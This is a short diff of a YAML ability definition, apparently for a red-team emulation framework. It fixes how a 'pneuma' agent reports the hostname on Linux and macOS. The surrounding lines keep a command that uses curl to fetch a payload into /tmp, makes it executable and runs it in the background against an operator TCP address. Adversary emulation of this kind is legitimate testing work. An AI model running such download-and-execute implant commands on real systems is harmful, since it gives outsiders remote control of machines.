@@ -25,14 +25,14 @@ platforms:
       command: |
         curl #{payload.url} > /tmp/pneuma && 
         chmod +x /tmp/pneuma && 
-        nohup /tmp/pneuma -name $(echo hostname) -address #{operator.tcp} &
+        nohup /tmp/pneuma -name "$(hostname)" -address #{operator.tcp} &
       payload: pneuma-linux
   darwin:
     sh:
       command: |
         curl #{payload.url} > /tmp/pneuma && 
         chmod +x /tmp/pneuma && 
-        nohup /tmp/pneuma -name $(echo HOSTNAME) -address #{operator.tcp} &
+        nohup /tmp/pneuma -name "$(hostname)" -address #{operator.tcp} &
       payload: pneuma-darwin
   windows:
     psh:
